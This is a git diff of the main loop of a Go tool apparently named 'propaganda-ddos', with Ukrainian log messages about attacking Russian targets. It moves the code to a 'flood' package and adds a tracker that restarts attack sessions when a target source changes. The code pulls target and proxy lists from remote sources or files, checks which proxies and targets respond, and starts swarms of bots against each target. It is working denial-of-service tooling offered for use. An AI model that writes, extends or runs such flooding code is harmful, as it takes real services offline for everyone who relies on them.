@@ -13,7 +13,7 @@ import (
 	log "github.com/sirupsen/logrus"
 	"github.com/spf13/cobra"
 
-	"github.com/meddion/propaganda-ddos/pkg"
+	"github.com/meddion/propaganda-ddos/pkg/flood"
 )
 
 var (
@@ -103,7 +103,6 @@ func run(cmd *cobra.Command, args []string) {
 	epoch := 0
 	for {
 		epoch++
-		log.Infof("Готуюся до атаки русні :) Сесія: %d \n", epoch)
 		epochCtx, termEpoh := context.WithTimeout(rootCtx, time.Minute*time.Duration(refreshTime))
 
 		select {
@@ -114,38 +113,40 @@ func run(cmd *cobra.Command, args []string) {
 		}
 
 		var (
-			targets []pkg.Target
-			proxies []pkg.Proxy
+			targets []flood.Target
+			proxies []flood.Proxy
 			err     error
 		)
 
+		log.Infof("Готуюся до атаки русні :) Сесія: %d \n", epoch)
 		switch {
 		// Get data from a file
 		case srcFile != "":
-			targets, proxies, err = pkg.GetDataFromFile(epochCtx, srcFile, apiVersion)
+			targets, proxies, err = flood.GetTargetDataFromFile(epochCtx, srcFile, apiVersion)
 			if err != nil {
 				log.Fatalf("Не вдалося прочитати вміст файлу '%s': %v", srcFile, err)
 			}
 		// Get targets (no proxy) from args
 		case len(args) > 0:
-			targets = make([]pkg.Target, 0, len(args))
+			targets = make([]flood.Target, 0, len(args))
 			for _, arg := range args {
-				targets = append(targets, pkg.Target{URL: arg})
+				targets = append(targets, flood.Target{URL: arg})
 			}
-		// Get data from API
+		// Get data from API APIv1/APIv2
 		default:
 			if src == "" && gateway != "" {
-				src, err = pkg.GetSrcFromAPIGateway(epochCtx, gateway)
+				log.Infof("Обраний гейтвей: %s (ПЕРЕВІРТЕ НА ДОСТОВІРНІСТЬ)", sites)
+				src, err = flood.GetSrcFromGateway(epochCtx, gateway)
 				if err != nil {
-					log.Errorf("Отримуючи списки джерел: %w", err)
+					log.Errorf("Отримуючи списки джерел: %v", err)
 					continue
 				}
 			}
 
 			if src != "" {
-				log.Infof("Обране джерело: %s\n (ПЕРЕВІРТЕ ЙОГО ДОСТОВІРНІСТЬ)", src)
+				log.Infof("Обране джерело: %s (ПЕРЕВІРТЕ НА ДОСТОВІРНІСТЬ)", src)
 
-				targets, proxies, err = pkg.GetDataFromAPISrc(epochCtx, src, apiVersion)
+				targets, proxies, err = flood.GetTargetData(epochCtx, src, apiVersion)
 				if err != nil {
 					log.Errorf("Не вдалося отримати коректні дані від джерела: %v", err)
 					continue
@@ -155,6 +156,7 @@ func run(cmd *cobra.Command, args []string) {
 			}
 		}
 
+		var validSources []string
 		// Add targets from sources
 		if sites != "" {
 			for _, tSrc := range strings.Split(sites, ",") {
@@ -162,13 +164,14 @@ func run(cmd *cobra.Command, args []string) {
 				if tSrc == "" {
 					continue
 				}
-				log.Infof("Обране джерело для цілей: %s\n (ПЕРЕВІРТЕ ЙОГО ДОСТОВІРНІСТЬ)", sites)
-				ts, err := pkg.GetTargetsFromAPI(epochCtx, sites)
+				log.Infof("Обране джерело для цілей: %s (ПЕРЕВІРТЕ НА ДОСТОВІРНІСТЬ)", sites)
+				ts, err := flood.GetTargets(epochCtx, sites)
 				if err != nil {
 					log.Errorf("Не вдалося отримати коректні дані від джерела: %v", err)
 					continue
 				}
 
+				validSources = append(validSources, tSrc)
 				targets = append(targets, ts...)
 				log.Infoln("Дані із джерела підвантажено.")
 			}
@@ -181,12 +184,14 @@ func run(cmd *cobra.Command, args []string) {
 				if pSrc == "" {
 					continue
 				}
-				log.Infof("Обране джерело для проксі: %s\n (ПЕРЕВІРТЕ ЙОГО ДОСТОВІРНІСТЬ)", proxy)
-				p, err := pkg.GetProxyFromAPI(epochCtx, pSrc)
+				log.Infof("Обране джерело для проксі: %s (ПЕРЕВІРТЕ НА ДОСТОВІРНІСТЬ)", pSrc)
+				p, err := flood.GetProxy(epochCtx, pSrc)
 				if err != nil {
-					log.Errorf("Не вдалося отримати коректні дані від проксі джерела: %v", err)
+					log.Errorf("Не вдалося отримати коректні дані від проксі джерела %s: %v", pSrc, err)
 					continue
 				}
+
+				validSources = append(validSources, pSrc)
 				proxies = append(proxies, p...)
 				log.Infoln("Дані із джерела проксі підвантажено.")
 			}
@@ -195,7 +200,8 @@ func run(cmd *cobra.Command, args []string) {
 
 		// Proxy Validation
 		if checkProxy {
-			validProxies := pkg.ProxyValidation(epochCtx, proxies)
+			log.Infof("Приступаю до валідації проксі, надсилаючи запит на: %s", flood.TEST_PROXY_SITE)
+			validProxies := flood.ValidateProxy(epochCtx, proxies)
 			if len(validProxies) > 0 {
 				log.Infoln("Знайдено валідних проксі: %d\n", len(validProxies))
 				for i, proxy := range validProxies {
@@ -211,7 +217,8 @@ func run(cmd *cobra.Command, args []string) {
 		}
 
 		// Targets Validation
-		validTargets := pkg.ValidateTargets(epochCtx, targets, dnsResolve)
+		log.Infoln("Приступаю до валідації цілей...")
+		validTargets := flood.ValidateTargets(epochCtx, targets, dnsResolve)
 		if len(validTargets) == 0 {
 			log.Infoln("Цілей не знайдено")
 			continue
@@ -221,9 +228,21 @@ func run(cmd *cobra.Command, args []string) {
 			log.Printf("%d) %s\n", i+1, target.URL)
 		}
 
+		go func() {
+			changeTracker := make(chan string)
+			go flood.SourceContentTracker(epochCtx, validSources, changeTracker)
+
+			select {
+			case <-epochCtx.Done():
+			case src := <-changeTracker:
+				log.Infof("Вміст джерела %s змінено. Готуюся до нової сесії.", src)
+				termEpoh()
+			}
+		}()
+
 		var wg sync.WaitGroup
 		for _, target := range validTargets {
-			botSched := pkg.NewBotScheduler(target, proxies, botsNum, maxErrCount, onlyProxy)
+			botSched := flood.NewBotScheduler(target, proxies, botsNum, maxErrCount, onlyProxy)
 			if err := botSched.Start(epochCtx, &wg); err != nil {
 				log.Errorf("Не вдалося запустити ботів: %v\n", err)
 				continue
